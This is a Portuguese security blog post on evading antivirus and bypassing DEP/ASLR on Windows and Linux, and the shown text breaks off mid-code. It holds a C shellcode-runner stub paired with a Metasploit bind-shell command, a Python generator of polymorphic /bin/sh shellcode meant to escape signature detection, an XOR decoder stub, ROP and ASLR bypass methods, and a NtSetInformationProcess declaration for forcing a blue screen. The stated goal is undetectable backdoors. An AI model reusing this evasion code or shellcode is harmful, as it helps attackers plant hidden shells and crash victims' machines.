<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>Bypass Windows e Linux + metasploit [DEP ASLR]</title>
	
	<meta name="author" content="mh4x0f">

	<!-- Enable responsive viewport -->
	<meta name="viewport" content="width=device-width, initial-scale=1.0">

	<!-- Le HTML5 shim, for IE6-8 support of HTML elements -->
	<!--[if lt IE 9]>
	<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
	<![endif]-->

	<!-- Le styles -->
	<link href="/assets/resources/bootstrap/css/bootstrap.min.css" rel="stylesheet">
	<link href="/assets/resources/font-awesome/css/font-awesome.min.css" rel="stylesheet">
	<link href="/assets/resources/syntax/syntax.css" rel="stylesheet">
	<link href="/assets/css/style.css" rel="stylesheet">
	<link rel="shortcut icon" type="image/x-icon" href="/favicon.ico">
	<!-- Le fav and touch icons -->
	<!-- Update these with your own images
	<link rel="shortcut icon" href="images/favicon.ico">
	<link rel="apple-touch-icon" href="images/apple-touch-icon.png">
	<link rel="apple-touch-icon" sizes="72x72" href="images/apple-touch-icon-72x72.png">
	<link rel="apple-touch-icon" sizes="114x114" href="images/apple-touch-icon-114x114.png">
	-->

	<link rel="alternate" type="application/rss+xml" title="" href="/feed.xml">
</head>

<body>
	<nav class="navbar navbar-default visible-xs" role="navigation">
		<!-- Brand and toggle get grouped for better mobile display -->
		<div class="navbar-header">
			<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
				<span class="sr-only">Toggle navigation</span>
				<span class="icon-bar"></span>
				<span class="icon-bar"></span>
				<span class="icon-bar"></span>
			</button>
			
			<a type="button" class="navbar-toggle nav-link" href="http://github.com/mh4x0f">
				<i class="fa fa-github"></i>
			</a>
			
			
			<a type="button" class="navbar-toggle nav-link" href="http://twitter.com/mh4x0f">
				<i class="fa fa-twitter"></i>
			</a>
			
			
			<a type="button" class="navbar-toggle nav-link" href="mailto:mh4root@gmail.com">
				<i class="fa fa-envelope"></i>
			</a>
			
			<a class="navbar-brand" href="/">
				<img src="http://avatars.githubusercontent.com/u/6795613" class="img-circle" />
				
			</a>
		</div>

		<!-- Collect the nav links, forms, and other content for toggling -->
		<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
			<ul class="nav navbar-nav">
				<li class="active"><a href="/">Home</a></li>
				<li><a href="/categories.html">Categories</a></li>
				<li><a href="/tags.html">Tags</a></li>
			</ul>
		</div><!-- /.navbar-collapse -->
	</nav>

	<!-- nav-menu-dropdown -->
	<div class="btn-group hidden-xs" id="nav-menu">
		<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown">
			<i class="fa fa-bars"></i>
		</button>
		<ul class="dropdown-menu" role="menu">
			<li><a href="/"><i class="fa fa-home"></i>Home</a></li>
			<li><a href="/categories.html"><i class="fa fa-folder"></i>Categories</a></li>
			<li><a href="/tags.html"><i class="fa fa-tags"></i>Tags</a></li>
			<li class="divider"></li>
			<li><a href="#"><i class="fa fa-arrow-up"></i>Top of Page</a></li>
		</ul>
	</div>

	<div class="col-sm-3 sidebar hidden-xs">
		<!-- sidebar.html -->
<header class="sidebar-header" role="banner">
	<a href="/">
		<img src="http://avatars.githubusercontent.com/u/6795613" class="img-circle" style="width:112px;height:112px;" />
	</a>
	<h3 class="title">
        <a href="/"></a>
    </h3>
</header>


<div id="bio" class="text-center">
	One 0x41414141 worth a thousand words
</div>

<div id="contact-list" class="text-center">
	<ul class="list-unstyled list-inline">
		
		<li>
			<a class="btn btn-default btn-sm" href="https://github.com/mh4x0f">
				<i class="fa fa-github-alt fa-lg"></i>
			</a>
		</li>
		
		
		<li>
			<a class="btn btn-default btn-sm" href="https://twitter.com/mh4x0f">
				<i class="fa fa-twitter fa-lg"></i>
			</a>
		</li>
		
		
		<li>
			<a class="btn btn-default btn-sm" href="mailto:mh4root@gmail.com">
				<i class="fa fa-envelope fa-lg"></i>
			</a>
		</li>
		
	</ul>
	<ul id="contact-list-secondary" class="list-unstyled list-inline">
		
		
		<form class="col-lg-12" action="http://feedburner.google.com/fb/a/mailverify?uri=chmodsecurity" method="post" target="popupwindow" onsubmit="window.open('http://feedburner.google.com/fb/a/mailverify?uri=chmodsecurity', 'popupwindow', 'scrollbars=yes,width=250,height=220');return true" >
			<div class="input-group" style="width:240px;text-align:center;margin:0 auto;">
			<input type="hidden" value="chmodsecurity" name="uri" >
		  <input type="hidden" name="loc" value="pt_BR">
		  <input  id="input-rss"  style="width:160px;text-align:center;" placeholder="Digite  seu e-mail" class="form-control input-lg" type="text" name="email">
		  <span class="input-group-btn"><button id="btn-assinar" class="btn btn-lg btn-primary"  type="submit" value=" ASSINAR ">Assinar</button></span>
	      </div>
		</form>
	</ul>
</div>
<!-- sidebar.html end -->

	</div>

	<div class="col-sm-9 col-sm-offset-3">
		<div class="page-header">
  <h1>Bypass Windows e Linux + metasploit [DEP ASLR] </h1>
</div>
	
<article>
	<div class="col-sm-10">
	 <span class="post-date">
	   
	   October 
	   14th,
	   
	   2014
	 </span>
	  <div class="article_body">
	  <p>Há pouco tempo estava estudando sobre alocação de memoria, na tentaria de bypassar algumas proteções dos software Anti-vírus,  a princípio tentei de diversas forma usando Encode's do metasploit fiz várias combinações de encode's esperando a saída de um backdoor  Não-detectável, os encoder's do metasploit são muitos bons, pra época que eles foram desenvolvidos rsrsrs, porém para os AV eles já são bem conhecidos. Com isso em mente resolvi modelar um backdoor de uma forma customizada, não irei usar o msfpayload para gerar os executáveis, mas irei usar o msfencode para gerar o shellcode, os shellcode's depois gerado precisamos criar um  ponteiro para que ele possa receber a posicao onde nosso payload está. </p>

<div class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="o">==================</span><span class="n">Metasploit</span> <span class="o">=====================</span>
 <span class="p">.</span><span class="o">/</span><span class="n">msfpayload</span> <span class="n">windows</span> <span class="o">/</span> <span class="n">shell_bind_tcp</span> <span class="n">C</span>
<span class="o">===============================================</span>
<span class="n">Char</span> <span class="n">payload</span> <span class="p">[</span><span class="mi">4096</span><span class="p">]</span> <span class="o">=</span> <span class="s">&quot;shellcode Here&quot;</span> <span class="p">;</span>
<span class="kt">int</span> <span class="nf">main</span> <span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span> <span class="n">argv</span><span class="p">)</span> <span class="p">{</span> 
        <span class="p">(</span><span class="o">*</span> <span class="p">(</span><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="p">)</span> <span class="p">())</span> <span class="n">payload</span><span class="p">)</span> <span class="p">();</span> 
        <span class="k">return</span> <span class="p">(</span><span class="mi">0</span><span class="p">);</span> 
<span class="p">}</span></code></pre></div>

<p> Contudo, Esse código acima já está bem manjado pelos AV, mas é um código funcional tanto para o linux quanto para windows. Nem todo shellcode poderá funcionar no windows, talvez você receba um aviso de violação de memoria, ou até mesmo um "falha de segmentação " no linux.  Vamos para os encoder's:</p>
<pre class="code">
mh40xf@mh4x0flabs:~#./msfencode -l -a x86 

Framework Encoders (architectures: x86)
=======================================

Name                    Rank       Description
----                    ----       -----------
generic/none            normal     The "none" Encoder
x86/alpha_mixed         low        Alpha2 Alphanumeric Mixedcase Encoder
x86/alpha_upper         low        Alpha2 Alphanumeric Uppercase Encoder
x86/avoid_utf8_tolower  manual     Avoid UTF8/tolower
x86/call4_dword_xor     normal     Call+4 Dword XOR Encoder
x86/countdown           normal     Single-byte XOR Countdown Encoder
x86/fnstenv_mov         normal     Variable-length Fnstenv/mov Dword XOR Encoder
x86/jmp_call_additive   normal     Jump/Call XOR Additive Feedback Encoder
x86/nonalpha            low        Non-Alpha Encoder
x86/nonupper            low        Non-Upper Encoder
x86/shikata_ga_nai      excellent  Polymorphic XOR Additive Feedback Encoder
x86/single_static_bit   manual     Single Static Bit
x86/unicode_mixed       manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder
x86/unicode_upper       manual     Alpha2 Alphanumeric Unicode Uppercase Encoder
</pre>
<p> De todos, O que merece mais atenção e claro porque é  o mais usado é o shikata_ga_nai, até porque ele gera shellcode Polymorphic, ou seja, cada shellcode gerado será diferente do outro, o Rank dele é excellent (lembrei de mortalKombat agora hahahaha EXCELLENTE), creio eu que ele foi desenvolvido para bypassar IDS, NIDS etc... pois alguns IDS bloqueia sequencias de caracter em hex, que são conhecido como malicioso ex: uma shellbind, reverse. e quanto a estrutura do shelllcode ? então fica mais ou menos assim:</p>
<pre class="code">
                 No SHellcode 
|=============|=================|   
|      Decode        | Shellcode Encoded  |             |------------------------------------------------------------------------------------------------------|
|=============|=================|        4   |                                                                                                                               |
             PE File polymorphic                              V                                                                                                                               |
======================               ==================           ==================        ====================              |
|  PE Header (entry point)  |                |   Original Code      |               |           Decode          |         |       encoded Códe       |                |
======================               ==================           ==================        ====================               |
            1   |                                                                                                            ^             |                              ^               3                |
                |---------------------------------------------------------------------------------------|            V                              |                |--------------|
                                                                                                                                       2   | -----------------------|
</pre>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">random</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">re</span>

<span class="k">def</span> <span class="nf">gen_rand</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
    <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">urandom</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>


<span class="k">def</span> <span class="nf">get_xor</span><span class="p">():</span>
    <span class="n">instruction</span> <span class="o">=</span> <span class="p">[</span><span class="s">&quot;rax&quot;</span><span class="p">,</span> <span class="s">&quot;rbx&quot;</span><span class="p">,</span> <span class="s">&quot;rcx&quot;</span><span class="p">,</span> <span class="s">&quot;rdx&quot;</span><span class="p">,</span> <span class="s">&quot;rsi&quot;</span><span class="p">]</span>
    <span class="n">xoring</span> <span class="o">=</span> <span class="p">{}</span>
    <span class="n">pushing</span> <span class="o">=</span> <span class="p">{}</span>
    <span class="n">cleanup</span> <span class="o">=</span> <span class="p">[</span><span class="s">&quot;</span><span class="se">\x48\x89\xe6\x48\x31\xc0</span><span class="s">&quot;</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\x48\x31\xc0\x48\x89\xe6</span><span class="s">&quot;</span><span class="p">]</span>
    <span class="n">xoring</span><span class="p">[</span><span class="s">&quot;rax&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x48\x31\xc0</span><span class="s">&quot;</span>
    <span class="n">xoring</span><span class="p">[</span><span class="s">&quot;rbx&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x48\x31\xdb</span><span class="s">&quot;</span>
    <span class="n">xoring</span><span class="p">[</span><span class="s">&quot;rcx&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x48\x31\xc9</span><span class="s">&quot;</span>
    <span class="n">xoring</span><span class="p">[</span><span class="s">&quot;rdx&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x48\x31\xd2</span><span class="s">&quot;</span>
    <span class="n">xoring</span><span class="p">[</span><span class="s">&quot;rsi&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x48\x31\xf6</span><span class="s">&quot;</span>
    <span class="n">pushing</span><span class="p">[</span><span class="s">&quot;rax&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x50</span><span class="s">&quot;</span>
    <span class="n">pushing</span><span class="p">[</span><span class="s">&quot;rbx&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x53</span><span class="s">&quot;</span>
    <span class="n">pushing</span><span class="p">[</span><span class="s">&quot;rcx&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x51</span><span class="s">&quot;</span>
    <span class="n">pushing</span><span class="p">[</span><span class="s">&quot;rdx&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x52</span><span class="s">&quot;</span>
    <span class="n">pushing</span><span class="p">[</span><span class="s">&quot;rsi&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x56</span><span class="s">&quot;</span>

    <span class="n">current</span> <span class="o">=</span> <span class="n">instruction</span><span class="p">[</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">4</span><span class="p">)]</span>
    <span class="k">return</span> <span class="p">[</span><span class="n">xoring</span><span class="p">[</span><span class="n">current</span><span class="p">],</span> <span class="n">pushing</span><span class="p">[</span><span class="n">current</span><span class="p">],</span> <span class="n">cleanup</span><span class="p">[</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)]]</span>
    

<span class="k">def</span> <span class="nf">get_shell</span><span class="p">():</span>
    <span class="n">shell</span> <span class="o">=</span> <span class="p">[</span><span class="s">&quot;</span><span class="se">\x2f\x62\x69\x6e\x2f\x2f\x73\x68</span><span class="s">&quot;</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\x2f\x2f\x62\x69\x6e\x2f\x73\x68</span><span class="s">&quot;</span><span class="p">]</span>
    <span class="k">return</span> <span class="n">shell</span><span class="p">[</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)]</span>

<span class="n">shellcode</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\xeb\x01</span><span class="s">[RAND1]</span><span class="se">\x68</span><span class="s">[RAND2][XOR][PUSH]</span><span class="se">\x48\xbb</span><span class="s">[SHELL]</span><span class="se">\x53\x48\x89\xe7</span><span class="s">[PUSH]</span><span class="se">\x48\x89\xe2\x57</span><span class="s">[CLEANUP]</span><span class="se">\x04</span><span class="s">[COUNT1]</span><span class="se">\x68</span><span class="s">[RAND3]</span><span class="se">\x04</span><span class="s">[COUNT2]</span><span class="se">\x0f\x05</span><span class="s">[RAND4]&quot;</span>

<span class="n">shellcode</span> <span class="o">=</span> <span class="n">shellcode</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">&quot;[RAND1]&quot;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">50</span><span class="p">,</span> <span class="mi">57</span><span class="p">))</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">&quot;hex&quot;</span><span class="p">))</span>
<span class="n">shellcode</span> <span class="o">=</span> <span class="n">shellcode</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">&quot;[RAND2]&quot;</span><span class="p">,</span> <span class="n">gen_rand</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
<span class="n">shellcode</span> <span class="o">=</span> <span class="n">shellcode</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">&quot;[RAND3]&quot;</span><span class="p">,</span> <span class="n">gen_rand</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
<span class="n">shellcode</span> <span class="o">=</span> <span class="n">shellcode</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">&quot;[RAND4]&quot;</span><span class="p">,</span> <span class="n">gen_rand</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mi">8</span><span class="p">)))</span>
<span class="n">shellcode</span> <span class="o">=</span> <span class="n">shellcode</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">&quot;[SHELL]&quot;</span><span class="p">,</span> <span class="n">get_shell</span><span class="p">())</span>

<span class="n">count</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">58</span><span class="p">)</span>
<span class="n">shellcode</span> <span class="o">=</span> <span class="n">shellcode</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">&quot;[COUNT1]&quot;</span><span class="p">,</span> <span class="nb">chr</span><span class="p">(</span><span class="n">count</span><span class="p">))</span>
<span class="n">shellcode</span> <span class="o">=</span> <span class="n">shellcode</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">&quot;[COUNT2]&quot;</span><span class="p">,</span> <span class="nb">chr</span><span class="p">(</span><span class="mi">59</span> <span class="o">-</span> <span class="n">count</span><span class="p">))</span>

<span class="n">current</span> <span class="o">=</span> <span class="n">get_xor</span><span class="p">()</span>
<span class="n">shellcode</span> <span class="o">=</span> <span class="n">shellcode</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">&quot;[XOR]&quot;</span><span class="p">,</span> <span class="n">current</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
<span class="n">shellcode</span> <span class="o">=</span> <span class="n">shellcode</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">&quot;[PUSH]&quot;</span><span class="p">,</span> <span class="n">current</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
<span class="n">shellcode</span> <span class="o">=</span> <span class="n">shellcode</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">&quot;[CLEANUP]&quot;</span><span class="p">,</span> <span class="n">current</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>

<span class="k">print</span> <span class="s">&quot;</span><span class="se">\\</span><span class="s">x&quot;</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\\</span><span class="s">x&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">&quot;..&quot;</span><span class="p">,</span> <span class="n">shellcode</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&quot;hex&quot;</span><span class="p">)))</span></code></pre></div>

<p>Outro encode também  muito bom é o <a>jmp_call_additive</a>.</p>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="s">&#39;Stub&#39;</span>       <span class="o">=&gt;</span>
            <span class="s">&quot;</span><span class="se">\xfc</span><span class="s">&quot;</span>                <span class="o">+</span> <span class="c"># cld</span>
            <span class="s">&quot;</span><span class="se">\xbb</span><span class="s">XORK&quot;</span>            <span class="o">+</span> <span class="c"># mov ebx, key</span>
            <span class="s">&quot;</span><span class="se">\xeb\x0c</span><span class="s">&quot;</span>            <span class="o">+</span> <span class="c"># jmp short 0x14</span>
            <span class="s">&quot;</span><span class="se">\x5e</span><span class="s">&quot;</span>                <span class="o">+</span> <span class="c"># pop esi</span>
            <span class="s">&quot;</span><span class="se">\x56</span><span class="s">&quot;</span>                <span class="o">+</span> <span class="c"># push esi</span>
            <span class="s">&quot;</span><span class="se">\x31\x1e</span><span class="s">&quot;</span>            <span class="o">+</span> <span class="c"># xor [esi], ebx</span>
            <span class="s">&quot;</span><span class="se">\xad</span><span class="s">&quot;</span>                <span class="o">+</span> <span class="c"># lodsd</span>
            <span class="s">&quot;</span><span class="se">\x01\xc3</span><span class="s">&quot;</span>            <span class="o">+</span> <span class="c"># add ebx, eax</span>
            <span class="s">&quot;</span><span class="se">\x85\xc0</span><span class="s">&quot;</span>            <span class="o">+</span> <span class="c"># test eax, eax</span>
            <span class="s">&quot;</span><span class="se">\x75\xf7</span><span class="s">&quot;</span>            <span class="o">+</span> <span class="c"># jnz 0xa</span>
            <span class="s">&quot;</span><span class="se">\xc3</span><span class="s">&quot;</span>                <span class="o">+</span> <span class="c"># ret</span>
            <span class="s">&quot;</span><span class="se">\xe8\xef\xff\xff\xff</span><span class="s">&quot;</span><span class="p">,</span> <span class="c"># call 0x8</span></code></pre></div>

<p>O que acontece no  codificadores Aditivo de feedback é que cada (comprimento de dados) DWORD por exemplo, é  XORed com uma chave XOR diferente dependendo do anterior DWORD que foi XORed por XOR chave e vice-versa, até chegarmos a primeira DWORD que foi codificado por a chave XOR gerado. Jmp_call_additive utiliza uma forma muito dinâmica, e uma boa gabiarra para decodificar / codificar o  payload.</p>
<h3> Bypass DEP  Data Execution Prevention</h3>
<p> Vamos entender essa ganbiarra que "deu certo", falando do DEP, então esse cara é um recurso de segurança em sistemas modernos, Mac OS, linux e windows. Este recurso destina-se a impedir a execução de códigos de uma região da memória (Bit NX)não-executável em um aplicativo ou serviço. Já que surgiu o assunto vamos lá o Bit NX que deriva da expressão em inglês No eXecute, é uma tecnologia usada em alguns processadores e sistemas operacionais que separa de modo rígido as áreas de memória que podem ser usadas para execução de código daquelas que só podem servir para armazenar dados. Ele é usada com propósitos de segurança.(wiki) ai já sabe né essa versão foi implementada pela AMD inicialmente, mas logo em seguida a Intel também criou sua versão chamada de (Bit XD) do inglês  eXecute Disable. em fim o DEP fica ainda mais eficiente quando trabalha junto com o ASLR ou address space layout randomization, que o significado da sigla já diz tudo, mas vamos lá o ASLR é uma técnica que envolve organizar aleatoriamente as posições das áreas-chave de dados, usualmente incluindo  a base do executável e posição de bibliotecas, heap, e stack, no espaço de endereço do processo. </p>
<h3> Tá e Como funciona  isso tudo ? </h3>
<p>Basicamente esses troços foram criados para acabar com a vida de quem curti um shellcode, seja injetar ou até mesmo faze-los. dai você pode perguntar: tá e como eles fazem isso ? eles fazem isso  através de compensação aleatoriamente o local de módulos e certas estruturas na memória.(hehehe falei bonito :D) resumindo o DEP impedi que certos setores de memória, por exemplo, a pilha, de ser executado. Quando combinados, torna-se extremamente difícil de explorar vulnerabilidades em aplicações que utilizam shellcode ou programação orientada a retorno (ROP). Sem mais delongas o Mestre m0nad (Vitor Ramos Mello) fez  um incrível post mostrando como ele referi-se ROP na Unha :D.  <a href="http://blog.tempest.com.br/victor-mello/return-oriented-programming-unha.html" target="_blank">Link do post</a>, vale a pena conferir sou faz desse cara :), dando uma explicada caso você não entendeu o esquema vamos lá, o ROP basicamente ROP essencialmente envolve encontrar trechos existentes de código do programa (called Getgets ) e pulando para eles, de modo que você produz um resultado desejado. Uma vez que o código é parte da memória executável legítimo, DEP e NX não importa.  Estes Getgets são encadeados através da stack, que contém o 'exploit' payload. Cada entrada na stack corresponde ao endereço do dispositivo próxima da ROP. Cada dispositivo é sob a forma de instr1; instr2; instr3; InstrN ...; ret , de modo que o ret vai saltar para o próximo endereço na pilha depois de executar as instruções, encadeando assim os gadgets juntos. Muitas vezes, os valores adicionais têm de ser colocado na pilha, de modo a completar com sucesso a cadeia, devido às instruções que, de outro modo ficam no caminho. O truque consiste em encadear essas ROPs em conjunto, a fim de chamar a função de proteção de memória, como VirtualProtect , que é então usado para fazer o executável pilha, para que o seu shellcode pode executar, através de um jmp esp ou gadget equivalente. Ferramentas como  <a href="http://redmine.corelan.be/projects/mona" target="_blank">Mona.py</a>, pode ser usado para gerar essas correntes gadgets ROP, ou encontrar aparelhos ROP em geral.</p>
<h3> Legal! e o tão eficiente ASLR ? </h3>
<p>Existem algumas maneiras de contornar o ASLR segue a dica:</p>
<pre class="code">
Sobrescrever RET direto - Muitas vezes os processos com ASLR ainda irá carregar módulos não-ASLR, permitindo-lhe apenas executar o shellcode através de um jmp esp .
Partial EIP overwrite - substituir apenas uma parte da EIP, ou usar uma divulgação de informações confiável na pilha para descobrir qual é o verdadeiro EIP deve ser, em seguida, usá-lo para calcular o seu alvo. Nós ainda precisamos de um módulo não-ASLR para este embora.
NOP spray  - Criar um grande bloco de PON para aumentar as chances de salto pouso na memória legítimo. Difícil, mas possível, mesmo quando todos os módulos são ASLR habilitado. Não vai funcionar se a DEP está ligado embora.
Bruteforce - Se você pode tentar uma façanha com uma vulnerabilidade que não faz o programa falhar, você pode BruteForce 256 diferentes endereços de destino até que ele funciona.
</pre>
<p>A única maneira de contornar de forma confiável DEP e ASLR é através de um vazamento de ponteiro. Esta é uma situação em que um valor para a pilha, para um local de confiança, pode ser usado para localizar um ponteiro função utilizável ou Gadgets ROP. Uma vez feito isso, às vezes é possível para criar uma carga que ultrapassa de forma confiável ambos os mecanismos de proteção.</p>
<h3>Brincando com Windows Funções para Bypassar DEP</h3>
<h4><a name="weapon"></a>Choose your weapon</h4>
<table bordercolor="#000000" bordercolordark="#ffffff" width="100%" bordercolorlight="#ffffff" border="1">
<tbody>
<tr>
<td>API / OS</td>
<td>XP SP2</td>
<td>XP SP3</td>
<td>Vista SP0</td>
<td>Vista SP1</td>
<td>Windows 7</td>
<td>Windows 2003 SP1</td>
<td>Windows 2008</td>
</tr>
<tr>
<td>
<p align="left">VirtualAlloc</p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
</tr>
<tr>
<td>HeapCreate</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
</tr>
<tr>
<td>
<p align="left">SetProcessDEPPolicy</p>
</td>
<td>
<p align="center"><font color="#ff0000">no (1)</font></p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
<td>
<p align="center"><font color="#ff0000">no (1)</font></p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
<td>
<p align="center"><font color="#ff0000">no (2)</font></p>
</td>
<td>
<p align="center"><font color="#ff0000">no (1)</font></p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
</tr>
<tr>
<td>
<p align="left">NtSetInformationProcess</p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
<td>
<p align="center"><font color="#ff0000">no (2)</font></p>
</td>
<td>
<p align="center"><font color="#ff0000">no (2)</font></p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
<td>
<p align="center"><font color="#ff0000">no (2)</font></p>
</td>
</tr>
<tr>
<td>
<p align="left">VirtualProtect</p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
</tr>
<tr>
<td>
<p align="left">WriteProcessMemory</p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
<td>
<p align="center"><strong><font color="#008000">yes</font></strong></p>
</td>
</tr>
</tbody>
</table>
<p>Todas funções acima vale a pena conhecer mesmo elas sendo desabilitada pela microsoft, algumas dessas API já causaram muito estrago em termo de exploiting para o windows, uma delas tem a possibilidade de desabilitar o famoso DEP que tanto falamos, NtSetInformationProcess() que pode ser usada para simplesmente mudar os privilégio do DEP, entre outros métodos de bypass do DEP, como ROP e ret2lib que o m0nad também já escreveu sobre vale a pena procurar no blog dele, voltando ao assunto lembra da tela azul da morte (quer dizer até hoje ainda tem rsssr) então, podemos replicar aquele mesmo erro tão renomado da microsoft usando essa mesma API são chamados os Critical Process  que  é um tipo de processo que o Windows necessita para estar em execução - csrss.exe é um exemplo de tal processo. Sempre que um processo como este termina a sua execução (ou está terminada) do Windows responderá com uma autêntica tela azul da morte . A definição de um processo como um processo crítico é feito por PInvoking NtSetInformationProcess , de ntdll.dll (requer privilégios de depuração ). Mais informações sobre este método pode ser encontrado abaixo, na seção de codificação.</p>
<pre class="code">
Agora, sempre que um processo crítico seja encerrado, o kernel irá lançar um BSOD , com a seguinte verificação de erros:

*** STOP: 0x000000F4

0x000000F4 é o valor para CRITICAL_OBJECT_TERMINATION . 
</pre>
<p>a chamada dela em C# fica mais ou menos assim:</p>
<pre>
[ DllImport ( "ntdll.dll" ,  SetLastError  = True )]
private  static  extern  int  NtSetInformationProcess ( IntPtr hProcess ,  int processInformationClass ,  <br />
ref  int processInformation ,  int processInformationLength );
NTSTATUS NtSetInformationProcess(
IN HANDLE hProcessHandle,
IN PROCESS_INFORMATION_CLASS ProcessInformationClass,
IN PVOID ProcessInformation,
IN ULONG ProcessInformationLength );
Método Detalhes :
IntPtr hProcess = o identificador de processo "
int processInformationClass = é como uma 'flag' - nós fornecemos este valor 0x1D (BreakOnTermination)
